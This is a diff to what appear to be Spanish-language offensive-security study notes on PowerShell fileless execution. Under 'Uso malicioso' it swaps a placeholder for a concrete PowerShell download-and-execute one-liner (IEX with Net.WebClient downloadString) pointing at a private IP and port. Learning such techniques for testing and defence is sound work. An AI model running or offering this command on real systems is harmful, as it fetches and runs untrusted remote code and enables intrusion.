@@ -13,7 +13,7 @@ Esto va a ejecutar el comando Get-childItem, pero obviamente a esto se le puede 
 ## Uso malicioso
 
 ```powershell
-IEX (New-Object Net.WebClient).downloadString('http://IP/malicious.ps1')
+IEX (New-Object Net.WebClient).downloadString('http://192.168.1.21:2000/luna.ps1')
 ```
 
 Para una mayor explicación revisar [[Ejecuciones fileless]] 
